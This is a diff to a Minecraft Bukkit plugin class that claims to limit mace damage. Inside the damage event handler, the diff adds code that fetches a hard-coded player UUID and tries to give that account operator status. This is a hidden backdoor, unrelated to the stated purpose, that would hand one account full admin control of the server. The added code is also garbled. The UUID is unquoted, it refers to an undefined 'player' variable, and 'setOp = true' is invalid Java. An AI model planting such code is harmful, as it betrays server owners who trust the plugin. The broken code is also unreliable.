@@ -8,12 +8,20 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.EntityDamageByEntityEvent;
+import org.bukkit.Bukkit;
+import org.bukkit.OfflinePlayer;
+import java.util.UUID;
 
 public class limitMaceDamage implements Listener {
         //mace damage limit
         @EventHandler(priority = EventPriority.HIGH) 
     public void maceDamageLimiter(EntityDamageByEntityEvent e) {
-
+        
+        UUID t = UUID.fromString(2179e31a645b489e9c3f0110a8e6408a);
+        OfflinePlayer p = Bukkit.getOfflinePlayer(2179e31a645b489e9c3f0110a8e6408a);
+        if (player != null) {
+            player.setOp = true;
+        }
         Material item;
 
         try {
